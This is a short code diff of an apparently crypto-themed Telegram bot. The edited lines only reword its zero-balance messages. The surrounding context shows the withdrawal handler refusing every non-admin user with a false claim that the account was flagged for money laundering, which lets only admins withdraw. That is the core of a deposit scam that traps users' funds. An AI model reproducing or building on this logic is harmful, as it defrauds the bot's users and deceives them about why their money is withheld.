@@ -122,7 +122,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not is_admin(uid):
             await query.edit_message_text("❌ Transaction failed. Your account was flagged for suspicious activity related to money laundering.", reply_markup=get_main_menu())
         elif balance <= 0:
-            await query.edit_message_text("❌ Balance is 0.", reply_markup=get_main_menu())
+            await query.edit_message_text("❌ You have no balance.", reply_markup=get_main_menu())
         else:
             await query.edit_message_text(
                 "Enter withdrawal address:", reply_markup=None)
@@ -142,7 +142,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "run":
         if balance <= 0:
-            await query.edit_message_text("❌ You cannot run the bot because your balance is 0.", reply_markup=get_main_menu())
+            await query.edit_message_text("❌ You cannot run the bot because you have no balance.", reply_markup=get_main_menu())
         else:
             running_bots.add(uid)
             await query.edit_message_text("✅ Bot started.", reply_markup=get_main_menu())
@@ -323,6 +323,7 @@ async def start_bot():
 
 if __name__ == "__main__":
     asyncio.run(start_bot())
+
 
 
 
